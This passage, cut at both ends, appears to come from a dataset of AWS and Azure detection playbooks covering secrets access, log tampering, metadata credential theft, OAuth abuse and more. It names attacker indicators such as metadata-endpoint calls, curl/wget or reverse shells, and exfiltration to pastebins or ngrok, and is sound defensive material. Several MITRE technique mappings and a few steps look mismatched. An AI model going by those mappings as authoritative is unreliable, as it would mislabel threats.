- **Attack Steps**: 1. Enable detailed CloudTrail logging for secretsmanager.amazonaws.com service. 2. Alert on ListSecrets, GetSecretValue, and DescribeSecret API calls, especially in rapid succession. 3. Compare calling principal’s role or session name — flag if it's an EC2 instance or Lambda with no history of accessing secrets. 4. Look for access to secrets tagged env=prod or classification=high, indicating high-value data. 5. Trace previous CloudTrail logs to determine how this identity was obtained — look for lateral movement or role chaining. 6. Isolate the IAM role or user and disable permissions temporarily. 7. Rotate all accessed secrets and apply tighter IAM policies with least privilege. 8. Document affected secrets and generate compromise timeline.
- **Detection**: CloudTrail filter on secrets API
- **Solution**: Disable + Rotate + IR
- **Tags**: #aws #secretsmanager #credentialtheft

## Detection of Azure App Registration Abuse

- **Attack Type**: OAuth Token Misuse
- **Target**: Azure AD
- **Vulnerability**: Token abuse via app
- **MITRE**: T1550.001
- **Impact**: OAuth lateral movement
- **Tools**: Azure Audit Logs, Microsoft Graph, Sentinel
- **Scenario**: Adversary registers a malicious app and requests API permissions for lateral movement
- **Attack Steps**: 1. Monitor Application and ServicePrincipal object creation in Azure AD audit logs. 2. Alert on app registrations that request Mail.Read, Files.Read.All, or Graph permissions. 3. Cross-reference with ConsentToPermissionsGrantedUsingAccessToken entries to detect silent consent. 4. Detect if app registration is followed by token issuance logs — indicates active use. 5. Use Microsoft Graph to query all apps and dump permission scopes; flag overly broad scopes. 6. Disable or delete apps not owned by legitimate admin or lacking verifiedPublisher. 7. Notify tenant admin and enforce conditional access policies blocking risky app sign-ins. 8. Periodically export all registered apps and review for malicious configurations.
- **Detection**: AuditLog + Consent logs
- **Solution**: Revoke + Block + Review
- **Tags**: #azure #oauthabuse #m365security

## Detect CloudTrail Log Deletion Attempt

- **Attack Type**: Anti-Forensic Behavior
- **Target**: AWS
- **Vulnerability**: Logging evasion
- **MITRE**: T1562.002
- **Impact**: Log tampering
- **Tools**: AWS CloudTrail, Config, GuardDuty
- **Scenario**: Attacker attempts to stop logging or delete trails to evade detection
- **Attack Steps**: 1. Monitor for DeleteTrail, StopLogging, and UpdateTrail API actions in CloudTrail. 2. Alert when these actions originate from non-admin roles or after successful AssumeRole. 3. Examine whether logs have already been diverted or not forwarded to S3 correctly. 4. Use AWS Config to detect trail drift or deletion and auto-remediate by re-creating trail. 5. Track changes to bucket policies linked to CloudTrail delivery — often modified in tandem. 6. Quarantine the IAM principal used for this activity. 7. Enable GuardDuty finding correlation to see if this deletion is part of broader attack. 8. Re-initiate logging and conduct immediate compromise assessment.
- **Detection**: DeleteTrail alerting
- **Solution**: Auto-remediate trail + IR
- **Tags**: #cloudtrail #evasion #logtamper

## Detection of Unusual Azure CLI Usage

- **Attack Type**: CLI-Based Recon
- **Target**: Azure
- **Vulnerability**: API enumeration via CLI
- **MITRE**: T1087
- **Impact**: Reconnaissance
- **Tools**: Azure Activity Logs, Azure Monitor, KQL
- **Scenario**: Attacker uses Azure CLI or scripts to enumerate resources quietly
- **Attack Steps**: 1. Monitor for burst API calls via az CLI user agent. 2. Alert when single user performs multiple resource group, VM, or storage list operations rapidly. 3. Extract client IP and correlate with Sign-In logs — flag foreign or first-time IP. 4. Use Azure Monitor metrics to detect high-volume API hits per identity per hour. 5. Cross-reference with interactive logins — if none, user is likely using tokens or script auth. 6. Disable or restrict scripted access temporarily. 7. Perform impact assessment by analyzing all resources queried. 8. Share indicators with threat intelligence platforms.
- **Detection**: Azure Monitor + Activity Log
- **Solution**: Lockdown + Enrich + Investigate
- **Tags**: #azurecli #recon #blueops

## Alert on STS Token Abuse via AWS AssumeRole

- **Attack Type**: Temporary Credential Abuse
- **Target**: AWS STS
- **Vulnerability**: Temporary token abuse
- **MITRE**: T1078.004
- **Impact**: Short-term credential misuse
- **Tools**: AWS CloudTrail, GuardDuty
- **Scenario**: Use of temporary STS credentials from unexpected sources
- **Attack Steps**: 1. Monitor AssumeRole actions and log all role ARNs used. 2. Alert when AssumeRole is called from a source IP not previously associated with role usage. 3. Flag rapid AssumeRole → Admin API calls (e.g., CreateUser, PutUserPolicy). 4. Enrich logs with session tags and context from identity federation systems. 5. Validate if temporary credentials were abused from EC2 metadata service (IMDS abuse). 6. Quarantine session, invalidate tokens, and audit permissions of assumed role. 7. Rotate keys and review IAM trust policies. 8. Enable GuardDuty anomaly detection for continued tracking.
- **Detection**: IP + role behavior deviation
- **Solution**: Quarantine + Rotate + Alert
- **Tags**: #sts #tokenabuse #awssecurity

## Azure Detection of First-Time Sign-In via PowerShell

- **Attack Type**: Scripting Interface Abuse
- **Target**: Azure AD / O365
- **Vulnerability**: PowerShell session hijack
- **MITRE**: T1059.001
- **Impact**: Command-based abuse
- **Tools**: Azure AD Sign-In Logs, Sentinel, Defender for Cloud
- **Scenario**: User logs in via PowerShell for the first time and executes risky actions
- **Attack Steps**: 1. In Sign-In logs, monitor for ClientAppUsed: PowerShell combined with Success. 2. Filter for users who have never used PowerShell before. 3. If immediately followed by Set-Mailbox, Add-MailboxPermission, or New-InboxRule, flag as potential compromise. 4. Analyze userAgent and IPAddress, check for anomalous locations. 5. Check if session was conditional access compliant (MFA, risk-based policy). 6. Disable account if actions are high impact or suspicious. 7. Review entire command chain from Defender for Cloud history. 8. Reset user credentials and open IR ticket for follow-up.
- **Detection**: Log analysis + behavior diff
- **Solution**: Disable + IR + Credential reset
- **Tags**: #powershell #azuread #office365

## AWS GuardDuty Alert: IAM Credential Exfiltration via EC2

- **Attack Type**: Credential Leakage Detection
- **Target**: AWS
- **Vulnerability**: EC2 credentials exfiltration
- **MITRE**: T1557.003
- **Impact**: Cloud credential theft
- **Tools**: AWS GuardDuty, VPC Flow Logs, CloudTrail
- **Scenario**: GuardDuty detects EC2 instance accessing unusual API calls suggesting key exfiltration
- **Attack Steps**: 1. GuardDuty fires alert like IAMUser/InstanceCredentialExfiltration. 2. Retrieve affected EC2 instance ID and check associated IAM role. 3. Pull CloudTrail logs for recent activity from that instance — look for key extraction attempts, strange user-agents, or abnormal regions. 4. Use VPC Flow Logs to see outbound traffic to pastebins, ngrok, or public IPs. 5. If signs of exfiltration found, isolate EC2 instance immediately via Security Groups. 6. Rotate IAM keys and audit all access to associated S3 buckets or services. 7. Tag and snapshot volume for forensic memory and disk investigation. 8. Report incident via AWS Security Hub and block known IOCs.
- **Detection**: GuardDuty + VPC logs
- **Solution**: Isolate + Rotate + Snapshot
- **Tags**: #aws #ec2 #guardduty

## Detecting AWS EC2 Metadata Abuse for Credential Theft

- **Attack Type**: IMDS Abuse
- **Target**: AWS EC2
- **Vulnerability**: Metadata token leakage
- **MITRE**: T1557.003
- **Impact**: Credential abuse
- **Tools**: AWS CloudTrail, VPC Flow Logs, GuardDuty
- **Scenario**: Attacker uses SSRF or shell access to fetch credentials from EC2 instance metadata
- **Attack Steps**: 1. Monitor API calls to 169.254.169.254, which is the EC2 metadata service, via VPC Flow Logs or runtime agents. 2. Configure CloudTrail to log all GetCallerIdentity and AssumeRoleWithWebIdentity API calls. 3. Enable GuardDuty to detect InstanceCredentialExfiltration anomalies. 4. Flag EC2s making calls to the metadata endpoint but lacking reason (e.g., app EC2s using these unusually). 5. Check the calling process within the instance to confirm whether a reverse shell or curl/wget was used. 6. If compromise confirmed, immediately isolate EC2 via Security Groups. 7. Rotate IAM roles or keys associated with that instance. 8. Capture disk image of the instance for full forensic analysis.
- **Detection**: GuardDuty & VPC Flow Logs
- **Solution**: Quarantine + Rotate + Analyze
- **Tags**: #imds #credentialtheft #cloudsecurity

## Alert on Unusual Region Usage in AWS API Calls

- **Attack Type**: Geographic API Anomaly
- **Target**: AWS
- **Vulnerability**: Unauthorized regional activity
- **MITRE**: T1571
- **Impact**: Cloud misuse
- **Tools**: CloudTrail, AWS Config, SIEM
- **Scenario**: API calls made from regions not normally used by org (e.g., ap-northeast-2)
- **Attack Steps**: 1. Review CloudTrail logs for API calls from rare or unauthorized regions. 2. Build a baseline of normally used regions (e.g., us-east-1, eu-west-1). 3. When new regions appear in the logs, trigger an alert. 4. Cross-check user or role who made the call—if newly created or recently compromised, raise severity. 5. Inspect the API call contents—creation of resources like EC2, S3 buckets, or IAM users increases urgency. 6. Use AWS Config to identify if these regions were recently allowed in org SCPs. 7. Quarantine activity via AWS Organizations or SCPs by disabling service access in that region. 8. Rotate credentials and investigate lateral movement possibility.
- **Detection**: Region-based anomaly detection
- **Solution**: Limit region usage + Alert
- **Tags**: #aws #geoanomaly #cloudtrail

## Detecting Rapid EC2 Creation Followed by Key Pair Downloads

- **Attack Type**: EC2 Abuse
- **Target**: AWS EC2
- **Vulnerability**: EC2 launch + credential exposure
- **MITRE**: T1578
- **Impact**: Infrastructure abuse
- **Tools**: CloudTrail, AWS Config, Security Hub
- **Scenario**: Attacker launches EC2 and accesses keys to move laterally or host C2
- **Attack Steps**: 1. Enable logging for RunInstances, CreateKeyPair, ImportKeyPair, and GetPasswordData in CloudTrail. 2. Create alerts when these events occur in quick succession. 3. Detect unusual AMIs or launch configs used by attackers (e.g., public Ubuntu with exposed ports). 4. Check if EC2 has public IP or security group exposing SSH/HTTP. 5. Identify which IAM user or assumed role performed this action and trace login source. 6. Determine whether actions followed a successful AssumeRole call. 7. Terminate EC2 instances and invalidate associated key pairs. 8. Block user or role from launching instances via new policy enforcement.
- **Detection**: CloudTrail + config drift
- **Solution**: Kill EC2 + Alert + Block
- **Tags**: #aws #ec2abuse #keyexfil

## Azure Detection: Impossible Travel Sign-In

- **Attack Type**: Identity Anomaly
- **Target**: Azure AD
- **Vulnerability**: Geographic login anomaly
- **MITRE**: T1078.004
- **Impact**: Account compromise
- **Tools**: Azure AD Identity Protection, Sentinel, Defender for Cloud Apps
- **Scenario**: Login from two impossible geographies in a short time frame
- **Attack Steps**: 1. Enable Identity Protection risk detection policies for “Impossible Travel”. 2. Use Microsoft Sentinel rules to correlate login times and locations. 3. Flag if one login occurs in India and another in the US within 2 minutes. 4. If high-privileged user (admin, finance, etc.) is involved, escalate severity. 5. Check if Conditional Access or MFA was enforced — absence increases risk. 6. Notify user and trigger re-authentication or password reset. 7. Investigate device fingerprint, user agent, and sign-in method. 8. Suspend access if login seems scripted or involves automation.
- **Detection**: Impossible travel detection
- **Solution**: Suspend access + Reset
- **Tags**: #azure #geoanomaly #sso

## AWS CloudTrail Detection of Unusual Billing Spikes

- **Attack Type**: Resource Misuse Detection
- **Target**: AWS Billing
- **Vulnerability**: Cloud resource abuse
- **MITRE**: T1496
- **Impact**: Financial loss
- **Tools**: CloudTrail, AWS Budgets, Trusted Advisor
- **Scenario**: Attacker spins up expensive EC2 or Sagemaker resources for crypto mining or abuse
- **Attack Steps**: 1. Enable AWS Budgets with threshold alerts for cost spikes. 2. Use CloudTrail to monitor RunInstances, CreateNotebookInstance, CreateDBInstance. 3. Set rules to detect use of large or expensive instance types (e.g., p3.8xlarge, inf1.24xlarge). 4. Correlate spike with user identity and region — often attacker will use unexpected accounts or regions. 5. Use CloudWatch to monitor CPU utilization and network traffic. 6. Terminate high-cost resources not associated with business processes. 7. Block access via SCP or IAM deny policies for specific instance types. 8. Conduct credential review and rotate all suspected exposed keys.
- **Detection**: Budget + Instance alerts
- **Solution**: Limit usage + Monitor + Notify
- **Tags**: #aws #billingabuse #cloudfraud

## Detect Azure BLOB Storage Enumeration

- **Attack Type**: Data Reconnaissance
- **Target**: Azure Storage
- **Vulnerability**: Unauthenticated blob access
- **MITRE**: T1530
- **Impact**: Data exposure
- **Tools**: Azure Storage Logs, Defender for Storage, Sentinel
- **Scenario**: Attacker attempts to enumerate or download open or misconfigured storage containers
- **Attack Steps**: 1. Enable logging for ListContainers, ListBlobs, and GetBlob on storage accounts. 2. Use Sentinel to correlate IPs and client tools (e.g., Azure CLI, REST API). 3. Alert on requests with missing authentication headers or unusual referrers. 4. Check whether the accessed container was public or private — alert if public + sensitive. 5. Inspect network traffic if large downloads occur (e.g., backup or logs). 6. Block IP via NSG or firewall rules. 7. Reconfigure permissions to private and apply SAS policies. 8. Notify data owner and apply versioning for rollback.
- **Detection**: Storage access logs
- **Solution**: Lock down + Audit
- **Tags**: #azure #blobstorage #dataleak

## Alert on AWS KMS Key Misuse

- **Attack Type**: Key Access Abuse
- **Target**: AWS KMS
- **Vulnerability**: Key misuse
- **MITRE**: T1555
- **Impact**: Data access via KMS
- **Tools**: AWS KMS, CloudTrail, SIEM
- **Scenario**: Attacker attempts to decrypt or misuse customer-managed keys
- **Attack Steps**: 1. Enable full CloudTrail logging for kms:Decrypt, kms:Encrypt, and kms:GenerateDataKey. 2. Alert when KMS operations occur outside regular hours or by non-privileged users. 3. Inspect IAM role linked with request — validate if key access is required. 4. Detect burst of decryption requests — could signal ransomware or mass access. 5. Track actions using decrypted data — e.g., S3 download, EBS snapshot. 6. Disable key or rotate access policy to limit use. 7. Conduct impact assessment to determine what data was decrypted. 8. Notify compliance and audit teams.
- **Detection**: CloudTrail + anomaly detection
- **Solution**: Restrict + Rotate + Alert
- **Tags**: #aws #kms #keyabuse

## Azure Alert on User Adding Foreign Guest Accounts

- **Attack Type**: Guest Account Injection
- **Target**: Azure AD
- **Vulnerability**: Guest access abuse
- **MITRE**: T1078
- **Impact**: Backdoor access
- **Tools**: Azure AD Audit Logs, Sentinel
- **Scenario**: A user invites external identity to gain backdoor access
- **Attack Steps**: 1. Enable audit logs for Add user, Invite external user, and Add member to group. 2. Correlate guest invitations with role elevation or sensitive group assignments. 3. If guest account gets added to high-privileged groups like Global Admins, trigger high severity alert. 4. Check domain reputation of invited identity — block free-mail if not allowed. 5. Notify admin for approval and validate business justification. 6. Remove guest if unauthorized and disable inviting user's ability to add others. 7. Audit recent activity from the guest account. 8. Add to blocklist if behavior is abusive.
- **Detection**: Guest add logs + Role check
- **Solution**: Remove guest + Investigate
- **Tags**: #azure #guestuser #backdoor

## Detection of CloudTrail Config Tampering

- **Attack Type**: Log Manipulation
- **Target**: AWS CloudTrail
- **Vulnerability**: Logging evasion
- **MITRE**: T1562.002
- **Impact**: Forensic blind spot
- **Tools**: CloudTrail, AWS Config, Lambda Alerts
- **Scenario**: Attacker attempts to modify or delete log delivery to evade detection
- **Attack Steps**: 1. Monitor CloudTrail for UpdateTrail, DeleteTrail, or changes to S3BucketName or CloudWatchLogsLogGroupArn. 2. Alert if delivery logs are disabled or rerouted. 3. Cross-reference event initiator with CloudTrail login patterns — investigate anomalies. 4. Detect deletion of log groups or trail suppression. 5. Re-enable and reconfigure trail immediately. 6. Use Config rules to auto-correct logging configuration. 7. Investigate post-tampering activity for possible cover-up. 8. Restrict permissions to update trail configs.
- **Detection**: Config change alert
- **Solution**: Auto-remediate + Alert
- **Tags**: #cloudtrail #logtamper #evade

## Alert on Azure Resource Deletion Spree

- **Attack Type**: Mass Deletion
- **Target**: Azure
- **Vulnerability**: Destructive activity
- **MITRE**: T1485
- **Impact**: Resource loss
- **Tools**: Azure Activity Logs, Sentinel, Defender for Cloud
- **Scenario**: Malicious actor deletes multiple resources across subscriptions
- **Attack Steps**: 1. Enable audit logging for Delete operations across resource types. 2. Correlate if same user deletes >5 critical resources in <10 minutes. 3. Alert on deletion of VMs, VNets, NSGs, or Storage accounts. 4. Lock down subscription if confirmed malicious via Azure RBAC lock or policy. 5. Initiate IR and investigate user login activity and client IP. 6. Notify resource owners and recover deleted assets from backup or versioning. 7. Enforce stricter deletion policies and conditional access for critical roles. 8. Review role-based access reviews for stale privileges.
- **Detection**: Delete op correlation
- **Solution**: Lock + IR + Recover
- **Tags**: #azure #deletionattack #ir

## Detect Creation of Overprivileged IAM User

- **Attack Type**: IAM Misconfiguration
- **Target**: AWS IAM
- **Vulnerability**: Admin user creation
- **MITRE**: T1098
- **Impact**: Persistent access
- **Tools**: AWS CloudTrail, AWS Config, GuardDuty
- **Scenario**: Attacker creates IAM user with full administrative access for persistence
- **Attack Steps**: 1. Monitor CloudTrail for CreateUser, PutUserPolicy, AttachUserPolicy API calls. 2. Trigger alert when AdministratorAccess or wildcard * permissions are granted. 3. Correlate with login time and method—flag new sessions lacking MFA or from foreign IPs. 4. Determine if the new IAM user belongs to a previously unused group or is unlinked to active projects. 5. If user was created silently (no IAM alerting), treat it as high severity. 6. Immediately remove the user and detach attached policies. 7. Conduct an audit of all IAM changes within the past 24 hours. 8. Review CloudTrail for related role assumptions or key rotations.
- **Detection**: CloudTrail + IAM drift
- **Solution**: Delete user + Audit
- **Tags**: #aws #iam #adminabuse

## Detect Azure Resource Provider Registration Abuse

- **Attack Type**: Attack Surface Expansion
- **Target**: Azure
- **Vulnerability**: Unauthorized resource registration
- **MITRE**: T1578
- **Impact**: Increased attack surface
- **Tools**: Azure Activity Logs, Sentinel
- **Scenario**: Adversary registers unused Azure resource providers to enable unexpected APIs
- **Attack Steps**: 1. Enable auditing for RegisterResourceProvider and UnregisterResourceProvider actions. 2. Maintain a baseline list of allowed providers per subscription. 3. Alert when resource providers like Microsoft.KeyVault, Microsoft.Compute, or Microsoft.Automation are newly registered. 4. Check user or principal initiating the registration—flag if it’s a low-privilege user or automation account. 5. Correlate with follow-up API calls like creating keys, VMs, or runbooks. 6. If unauthorized, revoke provider registration and terminate dependent resources. 7. Apply policy-based restrictions to enforce only whitelisted providers. 8. Record the event and notify the cloud security team for full impact review.
- **Detection**: API monitoring + Sentinel
- **Solution**: Restrict + Revert + Monitor
- **Tags**: #azure #cloudapi #registerprovider

## Alert on AWS Lambda Function Overwrite

- **Attack Type**: Code Injection
- **Target**: AWS Lambda
- **Vulnerability**: Code manipulation
- **MITRE**: T1601.001
- **Impact**: Execution backdoor
- **Tools**: AWS CloudTrail, Lambda Audit Logs
- **Scenario**: Attacker modifies Lambda code to run malicious logic or exfiltrate data
- **Attack Steps**: 1. Log all UpdateFunctionCode, CreateFunction, PutFunctionConcurrency API calls. 2. Correlate actions with IAM principal—flag low-privilege users modifying high-risk functions. 3. Alert if code hash differs from known good deployments or untracked Git hashes. 4. Check if function was updated via console, CLI, or external CI/CD system. 5. Analyze CloudTrail requestParameters to extract uploaded code info or S3 bucket used. 6. Revert function to previous version or pull from Git-backed repo. 7. Rotate credentials that Lambda has access to, including DB and S3. 8. Perform security scan on function code to detect backdoors or exfil filters.
- **Detection**: Code hash check + audit logs
- **Solution**: Revert + Rotate + Audit
- **Tags**: #lambda #serverless #codeintegrity

## Azure Detection of Role Assignment to Service Principal

- **Attack Type**: Privilege Escalation via App
- **Target**: Azure AD
- **Vulnerability**: App privilege escalation
- **MITRE**: T1098.001
- **Impact**: Access escalation via app
- **Tools**: Azure AD Audit Logs, Sentinel
- **Scenario**: Attacker assigns sensitive roles (Contributor/Owner) to malicious service principal
- **Attack Steps**: 1. Track Add role assignment actions where target is a ServicePrincipal. 2. Alert on sensitive roles like Owner, User Access Administrator. 3. Cross-reference app object ID with Microsoft Graph to extract publisher verification status. 4. Determine if app is registered recently or outside normal automation process. 5. If app has no MFA policy or risky sign-ins, mark high risk. 6. Remove assignment and disable app access token issuance. 7. Notify identity admin and perform retroactive log search for abuse of access. 8. Apply Conditional Access and App Consent governance policies to prevent future misuse.
- **Detection**: RoleAssignment watch
- **Solution**: Revoke + Disable App
- **Tags**: #azure #serviceprincipal #escalation

## CloudTrail Detection: Root Login without MFA

- **Attack Type**: Root Account Risk
- **Target**: AWS Root User
- **Vulnerability**: No MFA enforcement
- **MITRE**: T1078.003
- **Impact**: High-risk account use
- **Tools**: AWS CloudTrail, Security Hub, IAM Settings
- **Scenario**: Root user login without MFA enabled or enforced
- **Attack Steps**: 1. In CloudTrail, monitor all ConsoleLogin events where userIdentity.type = Root. 2. Extract additionalEventData.MFAUsed and trigger alert if false. 3. Compare source IP with historical logins and threat intel. 4. Use Security Hub to aggregate this into High Severity Finding. 5. Immediately notify account owner and rotate credentials. 6. Restrict root user activities via Service Control Policies or remove permissions from IAM policies. 7. Enforce mandatory MFA in organization-wide policies. 8. Use automation (e.g., Lambda + CloudWatch) to disable access key rotation without MFA.
- **Detection**: CloudTrail filter on root logins
- **Solution**: Force MFA + Alert
- **Tags**: #aws #rootuser #mfa

## Detect AWS API Calls from Anonymous IP Proxies

- **Attack Type**: IP Reputation Abuse
- **Target**: AWS
- **Vulnerability**: Proxy IP abuse
- **MITRE**: T1589
- **Impact**: Obfuscation of source
- **Tools**: CloudTrail, GuardDuty, Threat Intel
- **Scenario**: API calls from known proxy/VPN or Tor exit nodes
- **Attack Steps**: 1. Forward CloudTrail logs to SIEM or Lambda pipeline with IP enrichment. 2. Match source IPs against known bad actors using ThreatFox, AbuseIPDB, or GuardDuty. 3. If match found, correlate with type of API call—privileged actions raise severity. 4. Alert if traffic is consistent with botnet patterns (low userAgent, repeated requests). 5. Automatically disable the IAM entity or revoke session token. 6. Notify account team and enforce IP allowlisting through VPC or WAF policies. 7. Integrate this feed with GuardDuty for future detection. 8. Log event in centralized threat dashboard and mark for long-term monitoring.
- **Detection**: IP enrichment + correlation
- **Solution**: Block IP + Rotate + Watchlist
- **Tags**: #ipreputation #guardduty #proxyabuse

## Alert on Azure Portal Access Using Legacy Authentication

- **Attack Type**: Deprecated Auth Risk
- **Target**: Azure AD / O365
- **Vulnerability**: Legacy protocol use
- **MITRE**: T1071.003
- **Impact**: Weak auth vector
- **Tools**: Azure AD Sign-In Logs, Microsoft 365 Logs
- **Scenario**: Detection of users accessing Azure services using POP/IMAP or basic auth
- **Attack Steps**: 1. Enable auditing for legacy protocols (IMAP, POP, SMTP) in Sign-In logs. 2. Correlate ClientAppUsed field with known legacy clients. 3. Flag when high-value users (Global Admin, CFO) authenticate via legacy method. 4. If login lacks MFA or uses older TLS, escalate alert severity. 5. Review mailbox audit logs to detect malicious inbox rules or forwarders. 6. Block protocol at tenant level using Authentication Policies. 7. Notify user to switch to modern auth clients and rotate credentials. 8. Monitor long-term for recurrence using compliance center.
- **Detection**: Sign-in client type filtering
- **Solution**: Disable protocol + Alert
- **Tags**: #azure #legacyauth #m365security

## AWS Detection of Unusual S3 Access Patterns

- **Attack Type**: S3 Reconnaissance
- **Target**: AWS S3
- **Vulnerability**: S3 scraping or exfiltration
- **MITRE**: T1530
- **Impact**: Data exposure
- **Tools**: S3 Access Logs, CloudTrail, GuardDuty
- **Scenario**: Attacker lists and accesses S3 objects rapidly
- **Attack Steps**: 1. Monitor CloudTrail for ListBuckets, ListObjectsV2, and GetObject API calls. 2. Correlate with source IP and user agent to detect script-based scraping. 3. Alert if more than 50 objects accessed in under 1 minute. 4. Use S3 server access logs to analyze exact object names and volumes. 5. Restrict or block IP temporarily using Bucket Policies or VPC endpoint restrictions. 6. Enable GuardDuty for automated findings such as S3/Recon:Access. 7. Review bucket permissions and disable public access if not needed. 8. Re-enable versioning and logging to maintain visibility.
- **Detection**: Access pattern anomaly
- **Solution**: Block + Lock + Monitor
- **Tags**: #s3 #dataaccess #guardduty

## Azure Alert on Automated Scripted Logins

- **Attack Type**: Bot Login Detection
- **Target**: Azure AD
- **Vulnerability**: Automation-based login
- **MITRE**: T1078
- **Impact**: Bot-based access
- **Tools**: Azure AD Sign-In Logs, Sentinel
- **Scenario**: Unusual frequency of logins via scripts or bots
- **Attack Steps**: 1. Monitor sign-ins for user agents like curl, python-requests, or powershell. 2. Alert on repeated failed logins followed by a success from same IP. 3. Flag accounts that log in >20 times/hour or at fixed intervals. 4. Disable token refresh if automated logins are confirmed. 5. Require re-authentication with MFA to confirm session legitimacy. 6. Suspend user temporarily if behavior is unfamiliar. 7. Apply adaptive access policies to block scripted logins. 8. Inform security operations team for further inspection.
- **Detection**: UserAgent + frequency analysis
- **Solution**: Suspend + Alert + Revalidate
- **Tags**: #automation #scriptedlogin #azuread

## AWS CloudTrail: Detection of CreateSnapshot and Share

- **Attack Type**: Snapshot Abuse
- **Target**: AWS EC2/EBS
- **Vulnerability**: Snapshot exfiltration
- **MITRE**: T1537
- **Impact**: Data theft
- **Tools**: CloudTrail, EC2 Logs, Security Hub
- **Scenario**: Adversary creates and shares snapshot of EC2/EBS to exfiltrate data
- **Attack Steps**: 1. Monitor for CreateSnapshot, ModifySnapshotAttribute, and ShareSnapshot actions. 2. Alert if snapshots are shared with accounts outside org or publicly (allAuthenticatedUsers). 3. Correlate with instance or volume metadata—determine if sensitive DBs involved. 4. Revoke sharing permissions using CLI or Console. 5. Notify account owner and disable snapshot copy functionality if not needed. 6. Tag snapshots for visibility and run automated checks. 7. Rotate all credentials stored on affected instance. 8. Lock down future snapshot sharing via policy constraints.
- **Detection**: Snapshot + permission watch
- **Solution**: Revoke + Rotate + Audit
- **Tags**: #snapshot #exfiltration #ebs

## Detect AWS GuardDuty Alert Suppression Attempt

- **Attack Type**: Defense Evasion
- **Target**: AWS GuardDuty
- **Vulnerability**: Alert tampering
- **MITRE**: T1562.001
- **Impact**: Hidden intrusion
- **Tools**: CloudTrail, GuardDuty, Config Rules
- **Scenario**: Attacker disables or suppresses GuardDuty alerts to evade detection during intrusion
- **Attack Steps**: 1. Enable logging of all UpdateDetector, DeleteDetector, or UpdateFindingsFeedback events in CloudTrail. 2. Create alerts when feedback is marked as NO_FEEDBACK or NOT_USEFUL on confirmed threats. 3. Investigate which IAM user performed the update — flag unknown or recently created identities. 4. Review if alert suppression coincides with other high-risk activities like EC2 launches or IAM changes. 5. Temporarily suspend GuardDuty detector disable action using SCP. 6. Re-enable detector with default rules and scan all resources. 7. Contact the SOC team and issue formal warning on misuse of alert suppression. 8. Rotate all access keys associated with the user for safety.
- **Detection**: CloudTrail + GuardDuty
- **Solution**: Restore + Enforce Policy
- **Tags**: #defenseevasion #aws #guardduty

## Azure Alert on Sudden MFA Registration Change

- **Attack Type**: Identity Hijack Attempt
- **Target**: Azure AD
- **Vulnerability**: MFA hijack vector
- **MITRE**: T1556.006
- **Impact**: Bypass of 2FA
- **Tools**: Azure AD Sign-in Logs, Identity Protection
- **Scenario**: A user or attacker re-registers MFA or removes MFA method to bypass second factor
- **Attack Steps**: 1. Monitor for Register security info and Delete method actions via audit logs. 2. Alert if method changes are made outside of normal business hours. 3. Flag accounts that remove one method (e.g., phone) and register a new one immediately. 4. Cross-reference IPs with login origin — raise risk if unfamiliar or foreign. 5. Revoke sign-in session and force re-authentication via MFA. 6. Notify user’s manager or IT desk for confirmation. 7. If malicious, disable account and initiate incident response. 8. Require admin approval for all MFA registration going forward via policy.
- **Detection**: Azure AD audit logs
- **Solution**: Suspend + Confirm
- **Tags**: #mfa #azuread #identityprotection

## Detect AWS CloudTrail Delivery S3 Bucket Changes

- **Attack Type**: Log Evasion
- **Target**: AWS CloudTrail
- **Vulnerability**: Log tampering
- **MITRE**: T1562.002
- **Impact**: Logging blindness
- **Tools**: AWS CloudTrail, S3 Bucket Policies
- **Scenario**: Attacker modifies S3 bucket where CloudTrail logs are delivered
- **Attack Steps**: 1. Monitor for UpdateTrail API calls where S3BucketName is changed. 2. Correlate this change with time of other sensitive activity, such as IAM updates. 3. Investigate if new bucket has weak permissions (e.g., public-read, open access). 4. If malicious, restore original bucket configuration immediately. 5. Use AWS Config to automatically detect and revert unauthorized bucket changes. 6. Trigger GuardDuty for abnormal log destination shifts. 7. Notify compliance and log forensics team of log redirection attempt. 8. Lock CloudTrail configuration via SCP or resource-based policies.
- **Detection**: Trail + Bucket audit
- **Solution**: Restore + Lock + Alert
- **Tags**: #cloudtrail #logtamper #aws

## Azure Monitor Alert on Service Principal Credential Leak

- **Attack Type**: Credential Exposure
- **Target**: Azure AD App
- **Vulnerability**: Leaked credentials
- **MITRE**: T1552.001
- **Impact**: Unauthorized access
- **Tools**: Azure Monitor, Defender for Cloud, Microsoft Graph
- **Scenario**: Adversary extracts or uses a leaked service principal key to access resources
- **Attack Steps**: 1. Detect usage of old or expired service principal secrets from previously dormant applications. 2. Flag any app secret used from an unusual IP, time zone, or outside corporate IP range. 3. Check if leaked credential was reused across subscriptions or tenants. 4. Monitor access patterns — alert on attempts to enumerate secrets, key vaults, or access PII. 5. Immediately disable the service principal and revoke all active tokens. 6. Investigate logs for usage window — determine what was accessed and exfiltrated. 7. Rotate keys in other tenants if credential was reused. 8. Notify app owners and enforce secret expiration policies.
- **Detection**: Key use + geo detection
- **Solution**: Disable App + Rotate
- **Tags**: #azure #credentialleak #secrets

## AWS EC2 Detection of Suspicious AMI Usage

- **Attack Type**: Custom AMI Exploitation
- **Target**: AWS EC2
- **Vulnerability**: AMI misuse
- **MITRE**: T1204.002
- **Impact**: Backdoored instance
- **Tools**: AWS EC2, CloudTrail, GuardDuty
- **Scenario**: Malicious AMI used to launch EC2 with pre-installed backdoors
- **Attack Steps**: 1. Log and analyze RunInstances calls and flag public or community AMIs. 2. Maintain allowlist of approved AMI IDs — alert on usage of unapproved images. 3. Correlate AMI ID with threat intel sources — raise priority if listed. 4. Inspect user data scripts for signs of encoded payloads or remote shell fetchers. 5. Terminate EC2 immediately if AMI is known to be weaponized. 6. Notify team managing instance or VPC of intrusion vector. 7. Update AMI controls via SCP and enforce image scanning pre-deploy. 8. Document incident for potential upstream abuse reporting to AMI creator.
- **Detection**: AMI ID + user data analysis
- **Solution**: Terminate + Alert
- **Tags**: #aws #ec2 #backdoorami

## Alert on Azure Subscription Ownership Transfer

- **Attack Type**: Privilege Hijack
- **Target**: Azure
- **Vulnerability**: Subscription privilege abuse
- **MITRE**: T1098.003
- **Impact**: Subscription hijack
- **Tools**: Azure Activity Logs, Sentinel
- **Scenario**: A malicious actor attempts to transfer subscription ownership
- **Attack Steps**: 1. Enable auditing for Transfer Subscription, Change Owner, or equivalent activity. 2. Alert when this occurs without prior change request logged. 3. Cross-reference IP and user identity—if it’s a guest account, escalate severity. 4. Determine if the new owner has associated external domain or suspicious contact. 5. Revert transfer and lock ownership actions behind approval workflow. 6. Apply Defender for Cloud app governance to prevent such takeover attempts. 7. Notify executive security contact of breach attempt. 8. Audit all resource-level permissions for possible lateral persistence.
